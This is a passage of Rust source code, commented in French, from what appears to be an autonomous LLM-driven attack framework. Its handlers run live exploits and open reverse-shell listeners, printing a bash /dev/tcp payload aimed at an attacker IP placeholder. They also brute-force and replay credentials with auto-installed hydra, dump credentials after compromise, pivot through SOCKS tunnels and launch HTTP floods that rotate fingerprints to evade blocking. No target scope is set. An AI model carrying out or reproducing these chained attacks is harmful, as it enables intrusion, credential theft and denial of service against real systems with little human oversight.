                host,
                summary.len(),
                summary.join("; ")
            )
        }
    }

    async fn action_exploit(&mut self, action: &PlannedAction) -> Result<String> {
        let host = extract_host(&action.target);
        let port = extract_port(&action.target).unwrap_or(0);

        println!(
            "   ⚔️  Exploit {} sur {}:{}...",
            action.technique, host, port
        );

        // ── Audit trail (p2b) : consigné AVANT toute exécution réseau puis
        // persisté immédiatement — la tentative reste traçable même si le
        // processus crashe ou est interrompu pendant l'exploitation.
        self.memory.log(
            "exploit",
            &action.technique,
            Some(&action.target),
            "attempt",
            &format!(
                "Tentative d'exploitation via {} sur {}:{}",
                action.technique, host, port
            ),
            "ai_agent",
        );
        let _ = self.memory.save();

        // NB : l'échec N'EST PAS pré-enregistré ici. Il est consigné par le
        // handler de `execute_action` (branche Err) ou par les branches de succès.
        // (Levier C : éviter les doubles entrées sous des clés d'hôte différentes.)

        // ── Moteur d'exploits natif (crate::exploit_engine) ──────────────────
        let tech = action.technique.to_lowercase();

        // Résolution par alias : le LLM peut fournir « CVE-2014-6271 (Shellshock) »,
        // « Shellshock » ou « exploit/shellshock » — on le ramène au nom exact du
        // module natif. Si aucun alias ne correspond, on NE lance PAS le moteur
        // (pas d'exécution aveugle) et on poursuit vers le manifest.
        let engine_module = crate::exploit_engine::resolve_engine_module(&action.technique);

        // ── Garde-fou de pré-condition (p1b) + anti-hallucination (p1c) ──────
        // Un CVE cité explicitement par le planificateur n'est accepté que s'il
        // existe dans la base locale. Les modules natifs (hard-codés) sont
        // réputés fiables et exemptés de ce contrôle.
        if engine_module.is_none() {
            if let Some(cve) = crate::cve::extract_cve_id(&action.technique) {
                if !crate::cve::cve_exists(&self.cve_db, &cve) {
                    println!("   🛑 Garde-fou : {} absent de la base CVE locale — technique non fiable, retour recon", cve);
                    return Err(anyhow!(
                        "Pré-condition non satisfaite : {} inconnu de la base locale (probable hallucination) — action annulée",
                        cve
                    ));
                }
                // Applicabilité au produit observé — best-effort, non bloquant.
                if let Some(h) = self.memory.hosts.get(&host) {
                    let products: Vec<String> = h
                        .services
                        .iter()
                        .filter_map(|s| s.split('/').next())
                        .filter(|p| !p.is_empty())
                        .map(|p| p.to_string())
                        .collect();
                    if !products.is_empty()
                        && !products
                            .iter()
                            .any(|p| crate::cve::cve_applies_to(&self.cve_db, &cve, p, "unknown"))
                    {
                        println!("   ⚠️  {} : aucun service connu de {} ({}) ne correspond au produit du CVE — poursuite prudente",
                            cve, host, products.join(","));
                    }
                }
            }
        }

        if let Some(module) = engine_module {
            let result = crate::exploit_engine::exploit_buffer_overflow(
                &host,
                port,
                module,
                &action.parameters,
            )
            .await;

            match result {
                crate::exploit_engine::ExploitResult::Success {
                    session_id,
                    shell_type,
                    user,
                    system_info,
                    proof,
                } => {
                    self.memory.record_exploit_attempt(&host, module, true);
                    self.memory.update_host_state(&host, HostState::Exploited);
                    self.memory.open_session(ActiveSession {
                        session_id: session_id.clone(),
                        host: host.clone(),
                        session_type: shell_type.clone(),
                        username: user.clone(),
                        privileges: if user == "root" || user.to_uppercase().contains("SYSTEM") {
                            "root".into()
                        } else {
                            "user".into()
                        },
                        opened_at: chrono::Utc::now().to_rfc3339(),
                        last_active: chrono::Utc::now().to_rfc3339(),
                        alive: true,
                        commands_run: 0,
                    });
                    return Ok(format!(
                        "COMPROMIS (engine) — session {} ({}) {}@{} | {} | preuve: {}",
                        session_id, shell_type, user, host, system_info, proof
                    ));
                }
                crate::exploit_engine::ExploitResult::Partial {
                    message,
                    info_gathered,
                } => {
                    return Ok(format!(
                        "Partiel (engine) {}:{} — {} | {}",
                        host, port, message, info_gathered
                    ));
                }
                crate::exploit_engine::ExploitResult::Failed { reason, error } => {
                    println!(
                        "   ⚠️  Engine: {} ({}) — repli sur le manifest",
                        reason, error
                    );
                }
                crate::exploit_engine::ExploitResult::Skipped { reason } => {
                    println!("   ⏭️  Engine ignoré : {} — repli sur le manifest", reason);
                }
            }
        }

        // ── Analyse d'exploit assistée par LLM (crate::llm_exploit) ──────────
        if tech == "llm" || tech == "llm_exploit" || tech == "llm-analyze" {
            if self.config.openrouter_key.is_empty() {
                return Err(anyhow!(
                    "Analyse LLM d'exploit requise mais aucune clé API configurée"
                ));
            }
            let cfg = crate::llm_exploit::LLMConfig {
                provider: "openrouter".into(),
                model: self.config.model.clone(),
                api_key: Some(self.config.openrouter_key.clone()),
                api_base: None,
                temperature: 0.4,
                max_tokens: 1024,
            };
            let analyzer = crate::llm_exploit::LLMExploitAnalyzer::new(cfg)?;
            let rec = analyzer
                .analyze_target(&host, port, &action.technique, None, None, None, &[])
                .await?;

            let mut out = format!(
                "Analyse LLM {}:{} — {} suggestion(s), confiance {:.0}%",
                host,
                port,
                rec.recommended_exploits.len(),
                rec.confidence * 100.0
            );
            for s in &rec.recommended_exploits {
                out.push_str(&format!(
                    "\n     • {} — {} ({:.0}%)",
                    s.exploit_name,
                    s.description,
                    s.success_probability * 100.0
                ));
            }
            return Ok(out);
        }

        // Utiliser le moteur d'exploits NRTG si manifest disponible
        if let Some(manifest) = &self.exploit_manifest {
            let node = GraphNode {
                id: format!("{}:{}", host, port),
                label: format!("{}:{}", host, port),
                host: host.clone(),
                port,
                risk: 5,
                services: vec![],
                banner: String::new(),
                version: String::new(),
                protocol: "tcp".to_string(),
                product: String::new(),
                cves: vec![],
                risk_reasons: vec![],
                reachable: true,
                ..Default::default()
            };

            let pentest_cfg = PentestConfig {
                dry_run: false, // exploit RÉEL ici (déjà confirmé)
                max_parallel: 2,
                request_timeout: std::time::Duration::from_millis(5000),
                retries: 1,
                exploit_depth: crate::exploits::ExploitDepth::Medium,
                max_exploit_impact: crate::exploits::ImpactLevel::Shell,
                allowed_target_networks: None,
            };

            let nodes = vec![node];
            let findings = run_pentest_all(&nodes, manifest, &pentest_cfg).await;
            let summary = summarize(&findings);

            if summary.vulnerable > 0 {
                self.memory
                    .record_exploit_attempt(&host, &action.technique, true);
                self.memory.update_host_state(&host, HostState::Exploited);

                // ── Listener TCP éphémère — attend la vraie connexion reverse shell ──
                // Choisir un port libre dans la plage 4400-4500
                let lport = find_free_port(4400, 4500).await.unwrap_or(4444);
                let laddr = "0.0.0.0";
                let mgr = self.session_mgr.clone();

                println!(
                    "   \x1b[38;5;196m[LISTENER]\x1b[0m Ouverture reverse shell TCP sur {}:{}",
                    laddr, lport
                );
                println!(
                    "   \x1b[90mPayload : bash -i >& /dev/tcp/<ATTACKER_IP>/{} 0>&1\x1b[0m",
                    lport
                );

                // Lancer le listener dans une tâche séparée (non-bloquant)
                let laddr_owned = laddr.to_string();
                let host_clone = host.clone();
                tokio::spawn(async move {
                    if let Err(e) = crate::shell::start_tcp_listener(&laddr_owned, lport, mgr).await
                    {
                        eprintln!("   [LISTENER] Erreur sur port {}: {}", lport, e);
                    }
                });

                // Attendre jusqu'à 30 secondes qu'une session apparaisse
                let wait_secs = 30u64;
                println!(
                    "   \x1b[36m[WAIT]\x1b[0m Attente connexion reverse shell ({} sec)...",
                    wait_secs
                );
                let session_id = wait_for_session(&self.session_mgr, &host_clone, wait_secs).await;

                match session_id {
                    Some(sid) => {
                        // Session réelle obtenue !
                        let sess = self.session_mgr.get(sid).await;
                        let (username, os) = sess
                            .as_ref()
                            .map(|s| {
                                (
                                    s.username.clone().unwrap_or_else(|| "unknown".into()),
                                    s.os.clone().unwrap_or_else(|| "unknown".into()),
                                )
                            })
                            .unwrap_or_else(|| ("unknown".into(), "unknown".into()));

                        self.memory.open_session(ActiveSession {
                            session_id: sid.to_string(),
                            host: host_clone.clone(),
                            session_type: "reverse/tcp".to_string(),
                            username: username.clone(),
                            privileges: if username == "root" {
                                "root".into()
                            } else {
                                "user".into()
                            },
                            opened_at: chrono::Utc::now().to_rfc3339(),
                            last_active: chrono::Utc::now().to_rfc3339(),
                            alive: true,
                            commands_run: 0,
                        });

                        println!(
                            "   \x1b[32m[SHELL]\x1b[0m Session {} obtenue — {}@{} ({})",
                            sid, username, host_clone, os
                        );

                        if let Some(ref emitter) = self.dashboard_emitter {
                            emitter
                                .send(crate::live_dashboard::DashboardEvent::Log {
                                    t: chrono::Utc::now().timestamp_millis() as u64,
                                    level: "critical".into(),
                                    source: "exploit_engine".into(),
                                    message: format!(
                                        "SUCCESS : Session {} obtenue sur {} ({}@{})",
                                        sid, host_clone, username, os
                                    ),
                                })
                                .await;
                        }

                        return Ok(format!(
                            "COMPROMIS ! Session TCP#{} ouverte — {}@{} OS={} | \
                             Utilisez --interact {} pour le contrôle manuel",
                            sid, username, host_clone, os, sid
                        ));
                    }
                    None => {
                        // Exploit confirmé vulnérable mais pas de connexion reçue
                        // (peut-être egress filtré) — enregistrer quand même
                        let fake_sid = format!("dry-{}-{}", host.replace('.', ""), port);
                        self.memory.open_session(ActiveSession {
                            session_id: fake_sid.clone(),
                            host: host.clone(),
                            session_type: "pending/tcp".to_string(),
                            username: "pending".to_string(),
                            privileges: "unknown".to_string(),
                            opened_at: chrono::Utc::now().to_rfc3339(),
                            last_active: chrono::Utc::now().to_rfc3339(),
                            alive: false,
                            commands_run: 0,
                        });
                        return Ok(format!(
                            "VULNÉRABLE ({}) mais aucune connexion reçue sur port {} en {}s. \
                             Vérifiez le filtrage egress. Relancez le payload manuellement : \
                             bash -i >& /dev/tcp/<ATTACKER_IP>/{} 0>&1",
                            action.technique, lport, wait_secs, lport
                        ));
                    }
                }
            }
        }

        // ── Agent d'exploitation autonome (dernier étage de la chaîne) ───────
        // Tente les exploits réseau directs (vsftpd 2.3.4, Shellshock,
        // Log4Shell), les signatures du manifest et, à défaut, un bruteforce
        // de credentials en mode furtif.
        {
            let node = GraphNode {
                id: format!("{}:{}", host, port),
                label: format!("{}:{}", host, port),
                host: host.clone(),
                port,
                risk: self
                    .memory
                    .hosts
                    .get(&host)
                    .map(|h| h.confirmed_cves.len() as i32)
                    .unwrap_or(0),
                services: self
                    .memory
                    .hosts
                    .get(&host)
                    .map(|h| h.services.clone())
                    .unwrap_or_default(),
                banner: self
                    .memory
                    .hosts
                    .get(&host)
                    .and_then(|h| h.notes.iter().find(|n| n.starts_with("banner=")).cloned())
                    .unwrap_or_default(),
                cves: self
                    .memory
                    .hosts
                    .get(&host)
                    .map(|h| {
                        h.confirmed_cves
                            .iter()
                            .map(|c| (c.clone(), 7.0f32, String::new(), String::new()))
                            .collect()
                    })
                    .unwrap_or_default(),
                protocol: "tcp".to_string(),
                reachable: true,
                ..Default::default()
            };

            let exploit_cfg = ExploitAgentConfig {
                dry_run: false,
                max_parallel: 2,
                timeout_secs: self.config.tcp_timeout.max(1),
                exploit_depth: "medium".to_string(),
                auto_brute: true,
                brute_mode: if self.config.stealth_mode {
                    "stealth".to_string()
                } else {
                    "quick".to_string()
                },
                auto_install: self.config.auto_install,
                assume_yes: self.config.assume_yes,
                ..ExploitAgentConfig::default()
            };

            let mut agent = ExploitAgent::new(exploit_cfg);
            let nodes = vec![node];

            let brief = self.build_brief(
                AgentRole::Exploit,
                action,
                (self.config.tcp_timeout.max(1) as u64) * 10,
            );
            println!(
                "   🎯 Brief ExploitAgent — cible={} hypothèse={} ({} preuve(s) de surface)",
                brief.target,
                brief.hypothesis.as_deref().unwrap_or("-"),
                brief.surface_evidence.len()
            );

            let native = agent.run(&nodes).await;

            // Normalisation du rapport natif en `AgentReport` : l'orchestrateur
            // ingère un contrat commun au lieu de fouiller un type ad hoc.
            let mut report = AgentReport::new(
                AgentRole::Exploit,
                action.target.clone(),
                format!(
                    "ExploitAgent — {} nœud(s) testé(s), {} exploit(s) abouti(s), {} credential(s) promu(s)",
                    native.targets_tested, native.successes, native.credentials.len()
                ),
            );
            report.credentials = native.credentials.clone();
            report.compromised = native.successes > 0;
            for p in &native.payloads_generated {
                report.findings.push(format!(
                    "payload {}: {}",
                    p.0,
                    p.1.chars().take(120).collect::<String>()
                ));
            }
            self.ingest_agent_report(&host, &report);

            if report.compromised || !report.credentials.is_empty() {
                self.memory.log(
                    "exploit",
                    "exploit_agent",
                    Some(&action.target),
                    "success",
                    &report.summary,
                    "ai_agent",
                );
                return Ok(report.summary.clone());
            }
            println!(
                "   ⏭️  ExploitAgent : aucun succès ({} exploit(s) tenté(s))",
                native.exploits_run
            );
        }

        Err(anyhow!(
            "Exploit {} échoué sur {}:{}",
            action.technique,
            host,
            port
        ))
    }

    async fn action_brute_force(&mut self, action: &PlannedAction) -> Result<String> {
        let host = extract_host(&action.target);
        let port = extract_port(&action.target).unwrap_or(22);

        println!(
            "   🔑 Bruteforce {} sur {}:{}...",
            action.technique, host, port
        );

        let service = action
            .technique
            .split('-')
            .next()
            .unwrap_or("ssh")
            .to_lowercase();
        let is_https = port == 443 || service == "https";

        // Utiliser le vrai module de bruteforce
        let mut cfg = crate::bruteforce::BruteConfig::quick();
        cfg.auto_install = self.config.auto_install;
        cfg.assume_yes = self.config.assume_yes;

        match crate::bruteforce::auto_brute(&host, port, &service, is_https, &cfg).await {
            Some(report) => {
                if let Some(success) = report.successes.first() {
                    let cred = Credential {
                        id: uuid::Uuid::new_v4().to_string(),
                        cred_type: CredentialType::Plaintext,
                        username: Some(success.username.clone()),
                        secret: success.password.clone(),
                        domain: None,
                        source_host: host.clone(),
                        service: service.clone(),
                        valid_on: vec![host.clone()],
                        harvested_at: chrono::Utc::now().to_rfc3339(),
                    };
                    self.memory.add_credential(cred);
                    return Ok(format!(
                        "CREDENTIAL TROUVÉ : {}:{} sur {}:{}  proof={}",
                        success.username,
                        success.password,
                        host,
                        port,
                        success.proof.as_deref().unwrap_or("")
                    ));
                }
                Err(anyhow!(
                    "Bruteforce {} — aucun credential valide sur {}:{} ({} essais)",
                    service,
                    host,
                    port,
                    report.total_tried
                ))
            }
            None => {
                // Service non couvert nativement. On vérifie d'abord qu'il est
                // réellement ouvert, puis on tente le repli hydra : l'outil
                // tiers est installé à la demande **et exécuté** — l'agent ne
                // se contente pas de suggérer la commande à l'opérateur.
                let reachable = tokio::time::timeout(
                    std::time::Duration::from_millis(800),
                    tokio::net::TcpStream::connect(format!("{}:{}", host, port)),
                )
                .await
                .map(|r| r.is_ok())
                .unwrap_or(false);

                if !reachable {
                    return Err(anyhow!("{}:{} inaccessible", host, port));
                }

                if let Some(report) =
                    crate::bruteforce::brute_via_hydra(&host, port, &service, &cfg).await
                {
                    if let Some(success) = report.successes.first() {
                        let cred = Credential {
                            id: uuid::Uuid::new_v4().to_string(),
                            cred_type: CredentialType::Plaintext,
                            username: Some(success.username.clone()),
                            secret: success.password.clone(),
                            domain: None,
                            source_host: host.clone(),
                            service: service.clone(),
                            valid_on: vec![host.clone()],
                            harvested_at: chrono::Utc::now().to_rfc3339(),
                        };
                        self.memory.add_credential(cred);
                        return Ok(format!(
                            "CREDENTIAL TROUVÉ (hydra) : {}:{} sur {}:{}",
                            success.username, success.password, host, port
                        ));
                    }
                    return Err(anyhow!(
                        "Bruteforce hydra {} — aucun credential valide sur {}:{} ({} essais)",
                        service,
                        host,
                        port,
                        report.total_tried
                    ));
                }

                Err(anyhow!(
                    "Service {} sur {}:{} ouvert mais non couvert : hydra indisponible \
                    (relancez avec --auto-install) ou aucun module hydra pour ce service",
                    service,
                    host,
                    port
                ))
            }
        }
    }

    /// Exécute un **outil tiers** (installé à la demande) — capacité générique.
    ///
    /// C'est ce qui rend l'agent capable d'utiliser réellement n'importe quel
    /// outil que le module d'installation sait fournir, au lieu de se limiter
    /// aux moteurs Rust embarqués ou de suggérer une commande à l'opérateur.
    /// L'outil est mis dans `action.tool`, ses arguments dans
    /// `parameters["args"]` (chaîne découpée comme un shell).
    async fn action_external_tool(&mut self, action: &PlannedAction) -> Result<String> {
        let host_for_tool = extract_host(&action.target);
        let port_for_tool = extract_port(&action.target);

        // 1) Résolution de l'outil.
        //    - un binaire explicite dans `tool` prime ;
        //    - sinon on déduit la capacité de l'intention (technique + rationale)
        //      et le registre choisit le meilleur outil *présent* sur la machine.
        let explicit = {
            let t = action.tool.trim();
            if t.is_empty() || t.starts_with("nrtg") {
                String::new()
            } else {
                t.to_string()
            }
        };

        let capability = crate::ai::capability_registry::match_intent(&format!(
            "{} {} {}",
            action.technique, action.tool, action.rationale
        ));

        let tool = if !explicit.is_empty() {
            explicit
        } else if let Some(cap) = capability {
            let (spec, available) = crate::ai::capability_registry::select(cap);
            if !available {
                println!(
                    "   i  Capacité '{}' : '{}' absent du PATH — tentative d'installation",
                    cap.label, spec.bin
                );
            }
            spec.bin.to_string()
        } else {
            let t = action.technique.trim().to_string();
            if t.is_empty() {
                return Err(anyhow!(
                    "external_tool : ni binaire ('tool') ni intention reconnue ('technique')"
                ));
            }
            t
        };

        // 2) Arguments : ceux fournis par le LLM, sinon le gabarit de la
        //    capacité adapté à la cible (URL, port, liste de mots…).
        let mut args = action
            .parameters
            .get("args")
            .map(|s| shell_split(s))
            .unwrap_or_default();
        if args.is_empty() {
            if let Some(cap) = capability {
                let spec = crate::ai::capability_registry::spec_for(cap, &tool)
                    .unwrap_or_else(|| crate::ai::capability_registry::select(cap).0);
                let port_eff = port_for_tool.unwrap_or(cap.default_port);
                args = crate::ai::capability_registry::render_args(spec, &action.target, port_eff);
                println!("   > Capacité '{}' → commande auto-générée", cap.label);
            }
        }

        let timeout = action
            .parameters
            .get("timeout_secs")
            .and_then(|s| s.parse::<u64>().ok())
            .filter(|s| *s > 0)
            .map(std::time::Duration::from_secs)
            .unwrap_or(std::time::Duration::from_secs(120));

        let host = host_for_tool;
        println!(
            "   🧰 Outil tiers '{}' sur {} ({} argument(s))",
            tool,
            host,
            args.len()
        );

        let auto_install = self.config.auto_install;
        let assume_yes = self.config.assume_yes;
        let run = tokio::task::spawn_blocking(move || {
            crate::installer::run_tool_blocking(&tool, &args, auto_install, assume_yes, timeout)
        })
        .await
        .map_err(|e| anyhow!("tâche d'exécution interrompue : {e}"))?
        .map_err(|e| anyhow!("{e}"))?;

        self.memory.log(
            "external_tool",
            &run.tool,
            Some(&host),
            if run.success() { "success" } else { "failure" },
            &format!("exit={:?} timeout={}", run.exit_code, run.timed_out),
            "ai_agent",
        );

        let verdict = if run.timed_out {
            format!(
                "Outil '{}' interrompu (plafond de {}s)",
                run.tool,
                timeout.as_secs()
            )
        } else if run.success() {
            format!("Outil '{}' exécuté avec succès", run.tool)
        } else {
            format!(
                "Outil '{}' terminé avec le code {:?}",
                run.tool, run.exit_code
            )
        };

        // 3) Parsing structuré : la sortie brute devient des artefacts typés,
        //    injectés dans la mémoire de campagne (ports, chemins, identifiants,
        //    hypothèses confirmées…) au lieu de rester une simple ligne de log.
        let findings = crate::ai::tool_parsers::parse(&run.tool, &run.combined(80_000), &host);
        let ingest_note = if findings.is_empty() {
            String::new()
        } else {
            let summary = crate::ai::tool_parsers::ingest(&mut self.memory, &host, &findings);
            if summary.is_empty() {
                String::new()
            } else {
                format!(
                    "\n[Parsing] {} artefact(s) — {}",
                    findings.len(),
                    summary.render()
                )
            }
        };

        let output = run.combined(6_000);
        let mut reply = verdict;
        if !output.trim().is_empty() {
            reply.push('\n');
            reply.push_str(&output);
        }
        reply.push_str(&ingest_note);
        Ok(reply)
    }

    async fn action_credential_reuse(&mut self, action: &PlannedAction) -> Result<String> {
        let target_host = extract_host(&action.target);
        println!("   🔄 Test credential reuse sur {}...", target_host);

        let creds: Vec<(Option<String>, String, String)> = self
            .memory
            .credentials
            .iter()
            .filter(|c| !c.valid_on.contains(&target_host))
            .map(|c| (c.username.clone(), c.secret.clone(), c.service.clone()))
            .collect();

        let mut successes = Vec::new();
        for (user, secret, service) in &creds {
            // Sans nom de compte, il n'y a rien de réel à rejouer.
            let user = match user {
                Some(u) if !u.is_empty() => u.clone(),
                _ => continue,
            };

            let service = canonical_service(service);
            let port = default_port_for_service(&service);

            // Vérification **réelle** : on rejoue la paire via les moteurs
            // natifs (repli hydra sinon). Un simple test TCP ne prouve rien —
            // un port ouvert ne dit pas si le credential est valide.
            let mut cfg = crate::bruteforce::BruteConfig::default();
            cfg.auto_install = self.config.auto_install;
            cfg.assume_yes = self.config.assume_yes;
            cfg.usernames = vec![user.clone()];
            cfg.passwords = vec![secret.clone()];
            cfg.max_attempts = 1;
            cfg.max_parallel = 1;
            cfg.stop_on_success = true;

            let is_https = port == 443;
            let verified =
                match crate::bruteforce::auto_brute(&target_host, port, &service, is_https, &cfg)
                    .await
                {
                    Some(report) => !report.successes.is_empty(),
                    None => crate::bruteforce::brute_via_hydra(&target_host, port, &service, &cfg)
                        .await
                        .map(|r| !r.successes.is_empty())
                        .unwrap_or(false),
                };

            if verified {
                let label = format!("{}@{}:{} ({})", user, target_host, port, service);
                self.memory
                    .mark_credential_valid(&user, secret, &target_host);
                successes.push(label);
            }
        }

        if successes.is_empty() {
            Err(anyhow!("Credential reuse échoué sur {}", target_host))
        } else {
            Ok(format!("Credentials valides : {}", successes.join(", ")))
        }
    }

    /// Construit le contexte **borné** remis à un sous-agent.
    ///
    /// On ne transmet pas la mémoire de campagne : uniquement la cible, le
    /// pourquoi de l'action, l'hypothèse du planner et les preuves de surface
    /// strictement rattachées à cette cible (bornées à 10 paramètres, 10
    /// endpoints et 3 bannières). C'est ce qui empêche la dérive de contexte
    /// du sous-agent quand la campagne grossit.
    fn build_brief(
        &self,
        role: AgentRole,
        action: &PlannedAction,
        max_duration_secs: u64,
    ) -> AgentBrief {
        let host = extract_host(&action.target);
        let mut surface_evidence: Vec<String> = Vec::new();

        if let Some(h) = self.memory.hosts.get(&host) {
            if let Some(s) = &h.web_surface {
                surface_evidence.push(format!(
                    "surface: {} endpoint(s), {} param(s), {} formulaire(s)",
                    s.endpoints.len(),
                    s.params.len(),
                    s.forms
                ));
                for p in s.params.iter().take(10) {
                    surface_evidence.push(format!("param:{}", p));
                }
                for e in s.endpoints.iter().take(10) {
                    surface_evidence.push(format!("endpoint:{}", e));
                }
            }
            for n in h.notes.iter().filter(|n| n.starts_with("banner=")).take(3) {
                surface_evidence.push(n.clone());
            }
        }

        AgentBrief {
            role,
            target: action.target.clone(),
            objective: action.rationale.clone(),
            hypothesis: if action.technique.is_empty() {
                None
            } else {
                Some(action.technique.clone())
            },
            surface_evidence,
            max_duration_secs,
        }
    }

    /// Ingère un rapport de sous-agent dans la mémoire de campagne.
    ///
    /// Point d'entrée **unique** : les sous-agents ne touchent jamais la mémoire
    /// eux-mêmes. Sans ça, chaque site de délégation réimplémente sa propre
    /// politique de promotion (creds, hôtes internes, privesc) et elles
    /// finissent par diverger.
    fn ingest_agent_report(&mut self, host: &str, report: &AgentReport) {
        for (cred_host, user, secret) in &report.credentials {
            if secret.is_empty() || secret == "*" {
                continue;
            }
            self.memory.add_credential(Credential {
                id: format!("cred-{}", uuid::Uuid::new_v4().simple()),
                cred_type: CredentialType::Plaintext,
                username: Some(user.clone()),
                secret: secret.clone(),
                domain: None,
                source_host: cred_host.clone(),
                service: report.role.to_string(),
                valid_on: vec![cred_host.clone()],
                harvested_at: chrono::Utc::now().to_rfc3339(),
            });
            self.memory.mark_credential_valid(user, secret, cred_host);
        }

        for h in &report.internal_hosts {
            let clean = h.split_whitespace().next().unwrap_or(h);
            if clean.parse::<std::net::IpAddr>().is_ok() {
                self.memory
                    .add_host(clean, vec![format!("discovered/{}", report.role)]);
            }
        }

        if report.compromised || report.root || !report.privesc_vectors.is_empty() {
            if let Some(h) = self.memory.hosts.get_mut(host) {
                h.state = HostState::Compromised;
                if report.root && !h.notes.contains(&"root=true".to_string()) {
                    h.notes.push("root=true".into());
                }
                for v in &report.privesc_vectors {
                    let note = format!("privesc:{}", v);
                    if !h.notes.contains(&note) {
                        h.notes.push(note);
                    }
                }
            }
        }

        self.memory.log(
            &format!("agent:{}", report.role),
            "sub_agent_report",
            Some(&report.target),
            if report.errors.is_empty() {
                "success"
            } else {
                "partial"
            },
            &format!(
                "{} | findings={} errors={}",
                report.summary,
                report.findings.len(),
                report.errors.len()
            ),
            "orchestrator",
        );
    }

    async fn action_post_exploit(&mut self, action: &PlannedAction) -> Result<String> {
        let host = extract_host(&action.target);
        println!("   🕵️  Post-exploitation sur {}...", host);

        // Vérifier qu'on a une session active
        let session = self
            .memory
            .sessions
            .values()
            .find(|s| s.host == host && s.alive)
            .cloned();

        let Some(session) = session else {
            return Err(anyhow!(
                "Aucune session active sur {} — lancer un exploit d'abord",
                host
            ));
        };
        let session_id: usize = session.session_id.parse().unwrap_or(0);

        // ── Délégation au sous-agent spécialisé ──────────────────────────────
        // L'énumération post-compromission, l'analyse de privesc (sudo/SUID), le
        // dump de credentials et la découverte d'hôtes internes (ARP) sont
        // confiés à `PostExploitAgent` — l'agent dédié à cette phase — au lieu
        // d'être exécutés en direct par l'agent généraliste.
        let agent_cfg = PostExploitAgentConfig {
            lhost: "0.0.0.0".to_string(),
            lport: 4444,
            ..PostExploitAgentConfig::default()
        };
        let mut agent = PostExploitAgent::new(agent_cfg, self.session_mgr.clone());

        let brief = self.build_brief(AgentRole::PostExploit, action, 300);
        println!(
            "   🕵️  Brief PostExploitAgent — cible={} hypothèse={} ({} preuve(s) de surface)",
            brief.target,
            brief.hypothesis.as_deref().unwrap_or("-"),
            brief.surface_evidence.len()
        );

        let native = agent.run_on_session(session_id).await;

        // Normalisation du rapport natif en `AgentReport` : l'orchestrateur
        // n'ingère plus un type ad hoc, il ingère le contrat commun.
        let mut report = AgentReport::new(
            AgentRole::PostExploit,
            action.target.clone(),
            format!(
                "{} cred(s), {} hôte(s) interne(s), {} vecteur(s) privesc",
                native.credentials_found.len(),
                native.internal_hosts.len(),
                native.privesc_vectors.len()
            ),
        );
        report.credentials = native
            .credentials_found
            .iter()
            .map(|(user, secret)| (host.clone(), user.clone(), secret.clone()))
            .collect();
        report.internal_hosts = native.internal_hosts.clone();
        report.privesc_vectors = native.privesc_vectors.clone();
        report.root = native.is_root;
        report.compromised = true;
        report.errors = native.errors.clone();
        report.findings.push(format!(
            "whoami={} hostname={} os={}",
            native.whoami.as_deref().unwrap_or("-"),
            native.hostname.as_deref().unwrap_or("-"),
            native.os_info.as_deref().unwrap_or("-")
        ));

        self.ingest_agent_report(&host, &report);

        // Afficher un résumé
        agent.print_summary();

        Ok(format!(
            "Post-exploit (PostExploitAgent) sur {} terminé — {}{}",
            host,
            report.summary,
            if report.root { " — ROOT ✅" } else { "" }
        ))
    }

    async fn action_pivot(&mut self, action: &PlannedAction) -> Result<String> {
        println!("   🔀 Pivot vers {}...", action.target);

        let pivot_host = extract_host(&action.target);

        // ── Délégation au sous-agent spécialisé ──────────────────────────────
        // L'ouverture du tunnel SOCKS5 routé (choix du port, spawn du proxy,
        // vérification de session) est confiée à `LateralAgent` — l'agent dédié
        // au mouvement latéral — au lieu d'être câblée dans l'agent généraliste.
        let agent = LateralAgent::new(LateralAgentConfig::default(), self.session_mgr.clone());
        let brief = self.build_brief(AgentRole::Lateral, action, 120);
        println!(
            "   🧭 Brief LateralAgent — cible={} objectif={}",
            brief.target, brief.objective
        );

        // Session d'appui : la première session vivante disponible.
        let active_session = self.memory.sessions.values().find(|s| s.alive).cloned();

        let Some(sess) = active_session else {
            // Fallback : aucun appui compromis, on retombe sur un scan direct.
            println!("   ⚠️  Aucune session active — pivot impossible, scan direct.");
            return self.action_scan(action).await;
        };

        let session_id: usize = sess.session_id.parse().unwrap_or(0);
        if session_id == 0 {
            return self.action_scan(action).await;
        }

        // L'agent ne touche pas la mémoire : il rend un AgentReport ingéré ici.
        let report = agent.run(&brief, session_id).await;
        let ok = report.errors.is_empty();

        if ok {
            self.memory.stats.pivots_executed += 1;
            if let Some(h) = self.memory.hosts.get_mut(&pivot_host) {
                h.state = HostState::Pivoting;
                h.pivot_depth = h.pivot_depth.max(1);
            }
        }

        let summary = report.summary.clone();
        self.ingest_agent_report(&pivot_host, &report);

        if !ok {
            println!("   ⚠️  [LateralAgent] {}", report.errors.join(" | "));
            return self.action_scan(action).await;
        }

        // Scan de reconnaissance via le tunnel fraîchement ouvert.
        let scan_result = self
            .action_scan(action)
            .await
            .unwrap_or_else(|_| "scan via pivot".into());

        Ok(format!("{} | {}", summary, scan_result))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_stress_test — l'agent IA pilote GoldenEye / HORDE
    // ═════════════════════════════════════════════════════════════════════
    async fn action_stress_test(&mut self, action: &PlannedAction) -> Result<String> {
        use crate::stress::goldeneye::{run_goldeneye, AttackMode, DosMethod, GoldenEyeConfig};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        let target_url = if action.target.starts_with("http") {
            action.target.clone()
        } else {
            format!("http://{}", action.target)
        };

        println!(
            "   🤖🌊 Stress test IA sur {} — technique={}",
            target_url, action.technique
        );

        // Parser la technique pour le mode
        let attack_mode = if action.technique.to_lowercase().contains("slowloris") {
            AttackMode::Slowloris
        } else if action.technique.to_lowercase().contains("rudy") {
            AttackMode::Rudy
        } else if action.technique.to_lowercase().contains("browser") {
            AttackMode::BrowserFlood
        } else {
            AttackMode::Flood
        };

        // Durée limitée à 30s depuis l'agent (sécurité)
        let duration = 30u64;
        let num_bots = if self.config.stealth_mode { 10 } else { 50 };

        let cfg = GoldenEyeConfig {
            url: target_url.clone(),
            attack_mode,
            num_bots,
            max_concurrent_bots: if self.config.stealth_mode { 5 } else { 25 },
            duration_secs: Some(duration),
            rotate_fingerprint_on_403: true,
            send_client_hints: true,
            send_sec_fetch: true,
            debug: false,
            ..GoldenEyeConfig::default()
        };

        println!(
            "   \x1b[38;5;196m[STRESS]\x1b[0m {} bots {} pendant {}s",
            num_bots,
            attack_mode.as_str(),
            duration
        );

        // Mémoriser dans la campagne
        self.memory.log(
            "stress_test",
            &action.technique,
            Some(&target_url),
            "running",
            &format!("{} bots {}s", num_bots, duration),
            "ai_agent",
        );

        // Lancer GoldenEye avec durée limitée
